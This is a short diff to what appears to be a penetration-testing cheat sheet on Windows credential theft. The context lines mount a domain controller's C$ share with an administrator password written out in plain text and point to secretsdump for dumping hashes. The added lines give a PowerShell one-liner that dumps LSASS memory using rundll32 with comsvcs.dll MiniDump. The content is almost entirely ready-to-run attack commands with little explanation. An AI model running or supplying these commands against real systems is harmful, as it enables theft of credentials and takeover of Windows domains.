@@ -184,3 +184,6 @@ Mount the remote C:\temp directoy to your local machine
 net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
 ```
 Now you can run secretsdump to dump the hashes (as shown in previous examples)
+
+#### Dumping LSASS using native commands
+```Invoke-Command -ScriptBlock {C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full}```
